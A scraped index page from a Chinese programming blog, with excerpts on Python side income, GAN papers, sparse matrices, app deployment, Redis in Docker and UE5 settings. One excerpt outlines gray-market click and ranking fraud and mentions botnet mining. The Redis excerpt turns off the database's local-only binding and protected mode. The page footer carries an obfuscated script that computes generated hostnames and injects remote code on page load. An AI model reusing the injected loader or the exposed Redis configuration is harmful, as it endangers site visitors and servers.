淘宝也曾一度打击过类似商品的关键词，比如直接禁止「毕业设计」这样的组合词出现在商品标题中，然后大家纷纷换成「毕业指导……程序设计」来命中用户包含「毕业设计」的 query。
这玩意儿可以赚多少钱呢？首先是要杜绝帮人写论文，这部分吃力不讨好，导师不可能让你论文一稿过，你有可能在接下来要为每一单付出长达半年的售后服务，所以有点技术干这行的都不会沦落去帮人写论文，必须告知为了符合淘宝平台相关政策，是不代写论文的，最多提供相关的技术文档。
只负责代码开发就相对容易很多，一般本科毕设都是偏工程研发的，这类门槛低，通用化代码很多，基本上找份开源的改一改就能完成任务；硕士毕设就有不少偏机器学习的，读一篇 paper 再撸上半天数据实现一个 overfitting 的算法实现，基本也就1-2天的工夫。
前者一份卖到一两千，后者一份卖到两三千，如果客源有保证的话，一天做一单就足够养活自己了。
4、白帽 Python 是嘿客第一语言就不必多说了，涉灰甚至涉嘿的内容数不胜数，很多时候在一念之间你就可以干出坏事来。
从好的方向来说，你可以挖掘国内各大网站漏洞并提交到官方渠道，往往会获得一笔不菲的奖励金。（别问我乌云啥时候恢复，我也不知道……）
所谓哪里有利益哪里就有灰嘿产，灰产常见于各种刷：刷广告点击、刷竞价排名、刷 App 下载榜、刷直播观众数、刷各路媒体点赞和阅读数……
只要你的爬虫功力足够强，这些都不在话下，毕竟说透了就是模拟请求，只不过有些是简单 HTTP Get 请求，有些是通过 Ajax 提交的 Post 请求，还有些是 Socket 请求，然后捋一捋事件中不同请求的时间线和依赖关系，还有一堆参数的生成方式等等差不多就能搞定。
嘿产目前最常见于利用肉鸡来进行挖矿，各位可以多关注关注自己 /etc/crontab，我曾经就在 Heartbleed 漏洞事件中受害过。宣传介绍嘿产能干什么好像不太妥，那就点到为止吧。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/512e76a35dc0f06aa3a2a6b6f5c5a7f3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cd00174c09aa7dd69998ed42d6d8c5d4/" rel="bookmark">
			（2020，ADA）用有限的数据训练生成对抗网络
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Training generative adversarial networks with limited data
公众号：EDPJ
目录
0. 摘要
1. 简介
2. GAN 中的过度拟合
2.1 随机鉴别器增强（stochastic discriminator augmentation）
2.2 设计不泄漏的增强
2.3 我们的增强流程
3. 自适应判别器增强
4. 评估
4.1 从零开始训练
4.2 迁移学习
4.3 小数据集
5. 结论
6. 更广泛的影响
参考
S. 总结
S.1 核心思想
S.2 方法
S.3 其他贡献
S.4 相关内容分析
0. 摘要 使用太少的数据训练生成对抗网络 (GAN) 通常会导致鉴别器过度拟合，从而导致训练发散。 我们提出了一种自适应鉴别器增强（adaptive discriminator augmentation，ADA）机制，可以显着稳定有限数据范围内的训练。 该方法不需要更改损失函数或网络架构，并且适用于从头开始训练以及在另一个数据集上微调现有 GAN。 我们在几个数据集上证明，现在仅使用几千张训练图像就可以获得良好的结果，通常将 StyleGAN2 结果与数量级更少的图像相匹配。 我们希望这能为 GAN 开辟新的应用领域。 我们还发现，广泛使用的 CIFAR-10 实际上是一个有限的数据基准，并将记录 FID 从 5.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cd00174c09aa7dd69998ed42d6d8c5d4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f983325c9b0efc4fda7acee0c1867b87/" rel="bookmark">
			（2020，DA）用于数据高效 GAN 训练的可鉴别数据增强（Differentiable Augmentation）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Differentiable augmentation for data-efficient gan training
公众号：EDPJ
目录
0. 摘要
1. 简介
2. 相关工作
3. 方法
3.1 重温数据增强
3.2 GAN 的可鉴别增强
4. 实验
4.1 ImageNet
4.2 FFHQ 和 LSUN-Cat 4.3 CIFAR-10 和 CIFAR-100 4.4 low-shot 生成 4.5 分析
5. 结论 参考
S. 总结
S.1 核心思想
S.2 网络结构 S.3 分析
0. 摘要 鉴于训练数据量有限，生成对抗网络 (GAN) 的性能会严重恶化。 这主要是因为判别器记住了确切的训练集。 为了解决这个问题，我们提出了可鉴别增强 (Differentiable Augmentation，DiffAugment)，这是一种通过对真实样本和假样本施加各种类型的可鉴别增强来提高 GAN 数据效率的简单方法。 以前尝试直接增加训练数据来操纵真实图像的分布，收效甚微； DiffAugment 使我们能够对生成的样本采用可鉴别的增强，有效地稳定训练，并导致更好的收敛。 实验证明了我们的方法在各种 GAN 架构和无条件和类条件生成的损失函数上的一致收益。 借助 DiffAugment，我们在 ImageNet 128x128 上实现了 6.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f983325c9b0efc4fda7acee0c1867b87/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0fb3a52faef8b0984d20fd7b96debbe0/" rel="bookmark">
			稀疏矩阵的压缩存储及其转置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		稀疏矩阵概念 个人理解：一个非零元很少且分布没有规律的矩阵
如何存储？ 这里暂且只介绍三元组顺序表的方法
我们使用一个三元组（i，j，k)来确定矩阵中的一个非零元，i表示行，j表示列，k即是第i行第j列的非零元。所以，稀疏矩阵可以用一个三元组表来表示。例如下图：
我们根据创建的三元组表，打印对应的元素，其余位置打印0，这样一个稀疏矩阵就完成了
稀疏矩阵的转置 矩阵的转置即是将行和列对调，对应到三元组表就是将i和j相互调换，重新排列三元组的次序。
如何处理呢？
一种方法就是对三元组表1的j进行从1开始的遍历扫描，每次找到一个就转置到表2中。
void TransposeSmatrix(TsMatrix&amp; m, TsMatrix&amp; t) {//m为待转置的三元组表，t为转置后的 t.mu = m.nu;//行列数交换 t.nu = m.mu; t.tu = m.tu; if (t.tu) { int q = 1;//t表的下标 for (int col = 1; col &lt;= m.nu; col++)//对列进行扫描 { for (int p = 1; p &lt;=m.tu; p++)//对m表遍历 { if (m.data[p].j == col)//找到了该列，进行转置 { t.data[q].i = m.data[p].j; t.data[q].j = m.data[p].i; t.data[q].e = m.data[p].e; q++; } } } } } 另一种方法是快速转置，我没认真学，以后有机会补上
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0fb3a52faef8b0984d20fd7b96debbe0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2369949acce083a829c6c31281ea28b6/" rel="bookmark">
			项目部署——后端Springboot&#43;前端VUE3
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		后端： 1.JDK环境配置： 服务器本身是没有装JDK的，
输入：java -version；会显示让你安装JDK，
输入：apt install openjdk-17-jre-headless
我们项目后端开发用的是JDK17，所以服务器也安装JDK17
2.Jar包打包； 使用IDEA打开项目，点击右侧栏目里的
Maven——》package；将其打包为JAR包；
3.Jar包传输到云服务器： 使用Xfpt，建立连接，将jar包传输到/usr/local/Englishstaus中
4.解压jar包： 进入到压缩包所在目录，执行以下操作之一：
1&gt;java -jar Englishstaus.jar：当前ssh窗口被锁定，不可进行其它操作，ctrl + c或直接关闭窗口停止程序；
2&gt;java -jar Englishstaus.jar &amp;： 当前ssh窗口不被锁定，可进行其它操作，当窗口关闭时，程序退出；
3&gt;nohup java -jar Englishstaus.jar &amp;：后台挂起程序，当账户退出或终端关闭时程序停止，日志文件存储在当前目录的nohup.out文件中；
4&gt;选用这个！！！nohup java -jar Englishstaus.jar &gt; log.txt &amp;
：指定输出日志到log.txt文件,后台挂起程序,当账户退出或终端关闭时,程序仍然运行；
5.查看端口占用情况，检查项目是否已运行： Ps processstatus aux 用于报告当前系统的进程状态 显示终端上的所有进程，包括其他用户的进程
lsof(list open files) -i:8088。查看服务器 8088 端口的占用情况： 优点：解压jar包时，使用的是第四条指令，所以无需重复解压，解压一次即可持续运行。
前端： 本来想安装nginx环境，然后部署在nginx上，但是限于个人能力，选用了另外一种更为简单的方法，但有一定缺陷。
1.使用VScode打开项目，在项目中添加server.js文件，文件内容为： 2.项目进行打包：npm run build;讲项目打包到dist文件夹； 输入Serve -s dist，提前预览部署后的效果； 将dist、node_modules、server.js在本地打包，并压缩； 3.将压缩包上传到云服务器，路径 /usr/local/qianduan 4.进入该路径，unzip qianduan.zip; 5.进入解压缩后的文件，输入Node server.js，项目开始运行 我这里之前已经运行过了，所以显示端口已占用。 缺点：会话窗口不能关闭，每次运行都要进入到后端的项目文件夹；输入node server.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2369949acce083a829c6c31281ea28b6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7475d0f68f956a374456aee517400e25/" rel="bookmark">
			Docker启动redis命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		0、获取并下载镜像
使用 docker search redis 查看镜像来源
1、启动容器，做映射
创建配置文件目录存放redis.conf
配置文件官网下载地址：http://download.redis.io/redis-stable/redis.conf
2、修改redis配置文件
bind 127.0.0.1 #注释掉这部分，这是限制redis只能本地访问
protected-mode no #默认yes，开启保护模式，限制为本地访问
daemonize no#默认no，改为yes意为以守护进程方式启动，可后台运行，除非kill进程，改为yes会使配置文件方式启动redis失败
databases 16 #数据库个数（可选），我修改了这个只是查看是否生效。。
dir ./ #输入本地redis数据库存放文件夹（可选）
appendonly yes #redis持久化（可选）
3、启动命令
docker run -p 6379:6379 --name redis -v /usr/local/docker/redis.conf:/etc/redis/redis.conf -d docker.io/redis:6.0 redis-server /etc/redis/redis.conf --appendonly yes 【完善版】将持久化文件挂载在宿主机上的启动命令：
docker run -p 6379:6379 --privileged=true --name redis -v /usr/local/docker/redis.conf:/etc/redis/redis.conf -v /usr/local/docker/data:/data -d docker.io/redis:6.0 redis-server /etc/redis/redis.conf --appendonly yes 命令解释说明：
-p 6379:6379 端口映射：前表示主机部分，：后表示容器部分。
--name myredis 指定该容器名称，查看和进行操作都比较方便。
-v 挂载目录，规则与端口映射相同。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7475d0f68f956a374456aee517400e25/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8753f6e6d5dcd4fd18bdb8092a304e66/" rel="bookmark">
			UE5 Lumen效果设置总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、开启Lumen： Edit - Project Settings - Rendering - Global Illumination - Lumen Edit - Project Settings - Rendering - Reflection - Lumen Edit - Project Settings - Rendering - Software Ray Tracing - Generate Mesh Distance Field 勾选
场景中 Post Processing Volumn - Global Illumination - Lumen，
Post Processing Volumn - Reflaction - Method - Lumen
二、开启光线追踪： 软件光追：(建议默认)
Edit - Project Settings - Rendering - Lumen - Software Ray Tracing Mode :
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8753f6e6d5dcd4fd18bdb8092a304e66/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8fbdfcca72afffcc68203b7dcb9e924d/" rel="bookmark">
			巧用Random随机数生成双色球号码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		下面是一个简单的Java程序，用于生成双色球彩票号码。双色球彩票包含6个红球号码（范围：1-33）和1个蓝球号码（范围：1-16）。这个程序使用HashSet来确保红球号码的唯一性，并使用Random类来生成随机号码。
import java.util.HashSet; import java.util.Random; import java.util.Set; public class DoubleColorBall { private static final int RED_BALL_COUNT = 6; private static final int RED_BALL_MAX = 33; private static final int BLUE_BALL_MAX = 16; public static void main(String[] args) { Set&lt;Integer&gt; redBalls = generateRedBalls(); int blueBall = generateBlueBall(); System.out.println("双色球号码："); System.out.println("红球：" + redBalls); System.out.println("蓝球：" + blueBall); } private static Set&lt;Integer&gt; generateRedBalls() { Set&lt;Integer&gt; redBalls = new HashSet&lt;&gt;(); Random random = new Random(); while (redBalls.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8fbdfcca72afffcc68203b7dcb9e924d/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/134/">«</a>
	<span class="pagination__item pagination__item--current">135/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/136/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>